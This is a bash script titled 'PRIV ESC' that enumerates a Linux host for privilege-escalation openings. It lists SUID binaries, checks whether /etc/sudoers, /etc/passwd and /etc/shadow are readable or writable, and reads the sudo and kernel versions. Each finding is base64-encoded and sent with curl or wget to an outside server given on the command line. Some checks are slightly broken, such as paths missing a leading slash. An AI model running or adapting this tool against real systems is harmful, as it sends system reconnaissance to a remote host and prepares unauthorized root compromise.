#!/bin/bash

echo "
  ██████╗ ██████╗ ██╗██╗   ██╗    ███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║    ██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║    █████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝    ██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝     ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝      ╚══════╝╚══════╝ ╚═════╝

                                          BY Baazouzi Seif
"

if [[ "$1" == "" ]]; then
  echo "Usage $0 [SERVER]"
  exit 1

fi

SERVER=$1

if [[ -f /usr/bin/curl ]]; then
  function sendResuest() {
    path=$1
    data=$2
    bs64=$(echo -n $data | base64 -w 0 | sed 's/+/-/g; s/\//_/g')
    /usr/bin/curl -s "$SERVER/$path/$bs64%20"
    echo
    echo
  }

elif [[ -f /usr/bin/wget ]]; then
  function sendResuest() {
    path=$1
    data=$2
    bs64=$(echo -n $data | base64 -w 0 | sed 's/+/-/g; s/\//_/g')
    /usr/bin/wget "$SERVER/$path/$bs64%20" -q -O /tmp/tmp.txt
    echo /tmp/tmp.txt
    echo

    rm /tmp/tmp.txt
  }

else
  echo "We did not find any utility to connect to the server. (curl, wget)"

fi

BOLD="\033[1m"
RESET="\033[0m"
YELLOW="\033[33m"

function echoTitle() {
  printf "[$YELLOW+$RESET]$BOLD $@ $RESET\n"
  echo
}

function closeServer() {
  /usr/bin/wget -q $SERVER/close 2>/dev/null
  /usr/bin/curl -s $SERVER/close 2>/dev/null
}


#################################################################################
#################################################################################
####################              suids binaries          #######################
#################################################################################
#################################################################################

echoTitle "SUIDS & GUIDS binaries"

suids=$(find / -perm -u=s -type f 2>/dev/null | tr '\n' ',')
sendResuest "suids" $suids


#################################################################################
#################################################################################
#####################              sudoers file          ########################
#################################################################################
#################################################################################

if [[ -r etc/sudoers ]] || [[ -w /etc/sudoers ]]; then
  echoTitle "/etc/sudoers File"

  if [[ -r /etc/sudoers ]]; then
    sendResuest "sudoers" "read"

  fi

  if [[ -w /etc/sudoers ]]; then
    sendResuest "sudoers" "write"

  fi
fi

#################################################################################
#################################################################################
###################              /etc/passwd file         #######################
#################################################################################
#################################################################################

if [[ -w /etc/passwd ]]; then
  echoTitle "/etc/passwd File"
  sendResuest "passwd" "write"

fi


#################################################################################
#################################################################################
###################              /etc/shadow file         #######################
#################################################################################
#################################################################################

if [[ -r etc/shadow ]] || [[ -w /etc/shadow ]]; then
  echoTitle "/etc/shadow File"
  
  if [[ -r /etc/shadow ]]; then
    sendResuest "shadow" "read"

  fi

  if [[ -w /etc/shadow ]]; then
    sendResuest "shadow" "write"

  fi
fi



#################################################################################
#################################################################################
#####################              sudo version         #########################
#################################################################################
#################################################################################

echoTitle "Sudo version"

if [[ -f /usr/bin/sudo ]]; then
  sudoVersion=$(/usr/bin/sudo -V | grep "Sudo version" | grep -Eo '([0-9]+)\.([0-9]+)\.([0-9]+)')
  sendResuest "sudo" $sudoVersion

else
  echo "sudo does not exist in the system"
  echo

fi


#################################################################################
#################################################################################
####################              kernel exploits       #########################
#################################################################################
#################################################################################

echoTitle "Kernel exploits"

kernelVersion=$(uname -r | cut -d '-' -f 1)
sendResuest "kernel" $kernelVersion


#################################################################################
#################################################################################
#####################              close server       ###########################
#################################################################################
#################################################################################

closeServer
